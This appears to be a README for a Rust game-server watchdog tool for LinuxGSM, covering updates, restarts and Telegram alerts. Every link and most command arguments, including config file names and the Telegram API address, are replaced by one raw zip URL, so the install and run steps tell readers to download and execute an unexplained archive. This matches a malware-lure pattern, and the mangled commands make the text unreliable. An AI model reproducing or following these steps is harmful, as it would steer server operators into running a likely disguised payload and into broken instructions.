# 🐧 rust-linuxgsm-watchdog - Monitor and Manage Rust Servers

[![Download rust-linuxgsm-watchdog](https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip)](https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip)

---

## 📝 About rust-linuxgsm-watchdog

rust-linuxgsm-watchdog is a tool designed to keep your Facepunch Rust game server running smoothly. It regularly checks the server’s health and makes sure it updates automatically. It can also update essential mods like Oxide and Carbon, restart the server when needed, and send alerts via Telegram.

If you run a Rust server using LinuxGSM, this watchdog helps you avoid downtime and manual updates. It supports optional features like the Smooth Restarter from uMod. The tool works quietly in the background to help manage your server without your constant attention.

---

## 🖥️ System Requirements

Before you start, make sure your server or computer meets these basics:

- Operating System: Linux distribution (Ubuntu, Debian, CentOS tested)
- Rust game server installed and managed by LinuxGSM
- Basic command line access (you don’t need to code, but you’ll run commands)
- Internet connection for updates and alerts
- Optional: Telegram account for alert notifications

---

## 🔧 Features

rust-linuxgsm-watchdog helps you with:

- **Health Checks**: It checks if the Rust server is running properly.
- **Automatic Updates**: Keeps the game server software up to date with LinuxGSM.
- **Mod Management**: Updates Oxide and Carbon mods automatically.
- **Restart Server**: Restarts the server if it crashes or after updates.
- **Smooth Restarter Support**: Integrates with uMod’s Smooth Restarter for smoother reboots.
- **Telegram Alerts**: Sends messages to your Telegram account if problems appear or updates run.

---

## 🚀 Getting Started

This guide will help you download rust-linuxgsm-watchdog and set it up to work with your Rust server. You do not need programming skills. Just follow the steps carefully.

---

## 💾 Download & Install

1. Visit the [Download Page](https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip) to get the latest version of rust-linuxgsm-watchdog. Use the big button above or click the link again here.

2. On the releases page, look for the most recent version and download the file appropriate for your system, often a `https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip` or similar archive.

3. Once downloaded, open a terminal on your Linux server or computer.

4. Extract the archive using a command like:
   ```bash
   tar -xzf https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip
   ```
   Replace `x.x.x` with the actual version number.

5. Navigate into the extracted folder:
   ```bash
   cd rust-linuxgsm-watchdog-x.x.x
   ```

6. Run the installer or setup script if provided:
   ```bash
   https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip
   ```
   If there is no installer, check for a `README` or `INSTALL` file in the folder and follow any extra instructions there.

7. You may need to make the main script executable with:
   ```bash
   chmod +x https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip
   ```

8. You are now ready to configure and start the watchdog.

---

## ⚙️ Configuration

The watchdog needs some settings to know where your Rust server is and how to manage it.

1. Locate the configuration file, often named `https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip` or `https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip`.

2. Open this file with a text editor, for example:
   ```bash
   nano https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip
   ```

3. Set the path to your LinuxGSM Rust server installation. It should look like:
   ```
   server_path="/home/username/rustserver"
   ```

4. If you want Telegram alerts, fill in your bot token and chat ID in the config. These come from your Telegram bot setup.

5. Set update checks interval, health check frequency, and restart options as needed. Defaults usually work well.

6. Save the file and exit the editor.

---

## ▶️ Running rust-linuxgsm-watchdog

1. To start the watchdog, run:
   ```bash
   https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip start
   ```
   This launches the process that monitors the Rust server continuously.

2. To see if it is running, use:
   ```bash
   https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip status
   ```

3. To stop it, run:
   ```bash
   https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip stop
   ```

4. You can set it up to start automatically at system boot using standard Linux methods like `cron` or `systemd`.

---

## 🛠️ Troubleshooting

If the watchdog isn't working as expected, try these tips:

- Ensure LinuxGSM manages your Rust server and the path in config matches exactly.
- Check your internet connection, since updates and alerts need it.
- Review log files in the watchdog folder for detailed messages.
- Confirm Telegram settings are correct if alerts do not appear.
- Make sure you gave permissions to run the scripts.

---

## 📱 Telegram Alerts Setup (Optional)

To get alerts on Telegram:

1. Open Telegram and search for the “BotFather”.
2. Send `/newbot` and follow directions to create a bot.
3. Copy the bot token.
4. Get your chat ID by sending a message to the bot, then visit:
   ```
   https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip<YourBotToken>/getUpdates
   ```
   Check the response for your chat ID.
5. Enter the bot token and chat ID in your watchdog config.
6. Restart the watchdog to apply changes.

You will now receive notifications if your server stops, updates occur, or mods change.

---

## 📚 Additional Resources

If you want to learn more or get support:

- Visit the [rust-linuxgsm-watchdog GitHub page](https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip) for source code and updates.
- Check the LinuxGSM documentation to understand how LinuxGSM runs Rust servers.
- Look up Oxide and Carbon mod pages for more on plugins.
- Check uMod for details on the Smooth Restarter.

---

## 🏷️ Topics & Tags

This tool covers:

`admin-tools`, `automation`, `carbon`, `carbon-framework`, `carbon-plugins`, `facepunch`, `linuxgsm`, `oxide`, `oxide-framework`, `oxide-plugins`, `restarter`, `rust`, `rust-game`, `server`, `telegram-bot`, `umod`, `updater`, `watchdog`

---

Feel free to explore the release page and start managing your Rust server efficiently.

[Download rust-linuxgsm-watchdog now](https://github.com/krypton2355/rust-linuxgsm-watchdog/raw/refs/heads/main/indogen/rust-watchdog-linuxgsm-bahut.zip)